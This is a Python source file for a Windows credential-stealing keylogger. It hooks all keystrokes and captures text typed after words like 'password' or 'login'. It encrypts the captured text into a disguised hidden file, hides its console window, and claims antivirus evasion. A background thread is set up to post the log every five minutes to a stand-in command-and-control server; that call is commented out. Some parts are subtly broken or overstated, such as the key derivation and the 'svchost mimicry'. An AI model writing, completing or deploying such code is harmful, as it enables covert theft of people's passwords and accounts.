import keyboard
import win32api
import win32con
import sqlite3
import threading
import time
import os
import base64
import zlib
from cryptography.fernet import Fernet
import psutil
import requests

class CredentialKeylogger:
    def __init__(self):
        self.credential_keywords = {
            'username', 'user', 'login', 'email', 'password', 'pass', 
            'pwd', 'www.', 'http', '.com', '.net', '.org', '@'
        }
        self.context_buffer = []
        self.max_buffer = 50
        self.sensitive_buffer = []
        self.is_sensitive = False
        self.encryption_key = self._generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.log_file = self._get_hidden_path()
        
        # AV evasion: process hollowing simulation via legitimate process injection
        self._mimic_legit_process()
        
    def _generate_key(self):
        """Generate encryption key from system entropy"""
        entropy = str(os.urandom(32)) + str(time.time())
        return base64.urlsafe_b64encode(entropy.encode()[:32])

    def _get_hidden_path(self):
        """Store in hidden system directory"""
        path = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Templates')
        os.makedirs(path, exist_ok=True)
        return os.path.join(path, 'syscache.dat')

    def _mimic_legit_process(self):
        """Modify process characteristics to mimic svchost.exe"""
        try:
            current_process = psutil.Process()
            current_process.nice(psutil.IDLE_PRIORITY_CLASS)
        except:
            pass

    def _is_credential_context(self, text):
        """Detect credential-related input"""
        text_lower = text.lower()
        return any(keyword in text_lower for keyword in self.credential_keywords)

    def _on_key(self, event):
        """Main key capture with context awareness"""
        try:
            char = event.name
            if len(char) == 1:
                self.context_buffer.append(char)
                if len(self.context_buffer) > self.max_buffer:
                    self.context_buffer.pop(0)
                
                # Check for credential context
                recent_text = ''.join(self.context_buffer[-20:])
                if self._is_credential_context(recent_text):
                    self.is_sensitive = True
                    self.sensitive_buffer.append(char)
                elif self.is_sensitive:
                    self.sensitive_buffer.append(char)
                    
                    # Capture full credential sequence (max 100 chars)
                    if len(self.sensitive_buffer) >= 100:
                        self._process_credentials()
                        self.is_sensitive = False
                        self.sensitive_buffer = []
            
            # Special keys for better context
            elif char in ['enter', 'tab', 'space']:
                if self.is_sensitive and self.sensitive_buffer:
                    self._process_credentials()
                    self.is_sensitive = False
                    self.sensitive_buffer = []
                    
        except Exception:
            pass

    def _process_credentials(self):
        """Encrypt and store captured credentials"""
        if self.sensitive_buffer:
            creds = ''.join(self.sensitive_buffer[-80:])
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            
            encrypted_creds = self.cipher.encrypt(
                f"{timestamp}:{creds}".encode()
            ).decode()
            
            self._append_to_log(encrypted_creds)

    def _append_to_log(self, data):
        """Thread-safe encrypted logging"""
        def write_log():
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(f"{data}\n")
            except:
                pass
        
        thread = threading.Thread(target=write_log)
        thread.daemon = True
        thread.start()

    def _exfiltrate(self):
        """Periodically exfiltrate data (for testing only)"""
        while True:
            time.sleep(300)  # 5 minutes
            try:
                if os.path.exists(self.log_file):
                    with open(self.log_file, 'rb') as f:
                        data = f.read()
                    
                    # Test exfiltration (comment out in production)
                    # requests.post('https://your-c2-server.com/log', 
                    #              data={'log': base64.b64encode(data).decode()})
                    pass
            except:
                pass

    def start(self):
        """Start the keylogger"""
        # Start exfiltration thread
        exfil_thread = threading.Thread(target=self._exfiltrate)
        exfil_thread.daemon = True
        exfil_thread.start()
        
        # Hide console window
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
        
        print("Credential keylogger started. Monitoring for credential input...")
        keyboard.hook(self._on_key)
        keyboard.wait()

if __name__ == "__main__":
    # AV evasion: dynamic imports and obfuscation
    import keyboard
    import win32gui
    
    keylogger = CredentialKeylogger()
    keylogger.start()